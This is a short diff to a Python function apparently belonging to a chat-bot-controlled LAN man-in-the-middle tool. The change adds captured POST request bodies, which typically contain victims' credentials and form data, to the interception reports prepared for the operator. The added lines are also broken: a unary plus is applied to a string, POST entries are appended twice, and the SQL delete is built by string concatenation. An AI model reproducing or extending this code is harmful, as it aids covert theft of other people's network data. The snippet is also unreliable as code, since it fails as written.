@@ -209,7 +209,9 @@ def mitmHandler(target, ID, bot):
                     if len(textline) > 3000:
                         break
                     else:
-                        textline += item[3] + "\n\n"
+                        if item[4] == "POST":
+                            textline += + item[4] + " ➖ " + item[3] + "\n📄 POST DATA:\n" + item[5] + "\n\n"
+                        textline += + item[4] + " ➖ " + item[3] + "\n\n"
                     DBcursor.execute("DELETE FROM lanGhost_mitm WHERE id=" + str(item[0]))
                     DBconn.commit()
                 if not textline == "📱 MITM - " + target[0] + "\n\n":
